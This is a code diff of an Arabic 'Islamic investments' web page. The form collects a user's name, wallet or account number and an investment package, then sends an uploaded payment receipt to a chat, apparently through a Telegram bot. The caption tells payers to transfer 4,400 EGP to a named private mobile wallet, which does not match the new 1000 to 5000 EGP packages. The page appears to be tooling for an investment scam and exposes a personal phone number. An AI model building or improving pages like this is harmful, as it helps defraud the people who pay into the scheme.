@@ -314,17 +314,17 @@
       </div>
 
       <div class="form-group">
-        <label for="userWallet">رقم المحفظة المحول منها:</label>
-        <input type="tel" id="userWallet" class="form-control" placeholder="مثال: 010xxxxxxxx">
+        <label for="userWallet">رقم الحساب أو المحفظة:</label>
+        <input type="tel" id="userWallet" class="form-control" placeholder="مثال: 010xxxxxxxx أو رقم الحساب">
       </div>
 
       <div class="form-group">
         <label for="packageSelect">الباقة الاستثمارية المختارة:</label>
         <select id="packageSelect" class="form-control">
           <option value="">اختر الباقة...</option>
-          <option value="باقة 4,400 جنيه">باقة 4,400 جنيه</option>
-          <option value="الباقة المتوسطة">الباقة المتوسطة</option>
-          <option value="الباقة المتقدمة">الباقة المتقدمة</option>
+          <option value="باقة 1000 جنيه">باقة 1000 جنيه</option>
+          <option value="باقة 2500 جنيه">باقة 2500 جنيه</option>
+          <option value="باقة 5000 جنيه">باقة 5000 جنيه</option>
         </select>
       </div>
     </div>
@@ -359,7 +359,7 @@
       const file = fileInput.files[0];
 
       if (!userName || !userWallet || !packageSelect) {
-        alert("يرجى إدخال الاسم، رقم محفظتك، واختيار الباقة أولاً قبل رفع الإيصال.");
+        alert("يرجى إدخال الاسم، رقم الحساب/المحفظة، واختيار الباقة أولاً قبل رفع الإيصال.");
         fileInput.value = "";
         return;
       }
@@ -372,7 +372,7 @@
       label.innerText = "جاري الإرسال...";
       fileInput.disabled = true;
 
-      const captionText = `🌙 إشعار استثمار جديد (الاستثمارات الإسلامية)!\n\n👤 اسم المستثمر: ${userName}\n📱 رقم محفظة العميل: ${userWallet}\n📦 الباقة المختارة: ${packageSelect}\n💰 المبلغ المطلوب: 4,400.00 EGP\n💳 المحفظة المحول إليها: 01203174947\n👤 اسم المستلم: ALI AHMED GAMAL`;
+      const captionText = `🌙 إشعار استثمار جديد (الاستثمارات الإسلامية)!\n\n👤 اسم المستثمر: ${userName}\n📱 رقم الحساب أو المحفظة: ${userWallet}\n📦 الباقة المختارة: ${packageSelect}\n💰 المبلغ المطلوب: 4,400.00 EGP\n💳 المحفظة المحول إليها: 01203174947\n👤 اسم المستلم: ALI AHMED GAMAL`;
 
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
